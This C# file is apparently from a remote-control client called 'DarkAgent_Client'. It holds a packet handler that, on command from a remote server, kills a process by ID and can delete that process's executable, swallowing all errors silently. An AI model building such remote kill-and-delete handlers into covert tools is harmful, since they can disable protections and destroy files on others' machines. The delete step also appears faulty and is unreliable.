using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    public class R_KillProcess : ReceiveBasePacket
    {
        public R_KillProcess(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private int PID;
        private byte Force;
        private byte DeleteFile;

        public override void Read()
        {
            PID = ReadInteger();
            Force = ReadByte();
            DeleteFile = ReadByte();
        }

        public override void Run()
        {
            KillProcess(PID, Convert.ToBoolean(Force), Convert.ToBoolean(DeleteFile));
        }

        public void KillProcess(int PID, bool Force, bool DeleteFile)
        {
            try
            {
                Process proc = Process.GetProcessById(PID);

                if (Force)
                    proc.Kill();
                else
                    proc.CloseMainWindow();

                if (DeleteFile)
                {
                    proc.WaitForExit();
                    File.Delete(proc.MainModule.FileName.ToString());
                }
            }catch{}
        }
    }
}
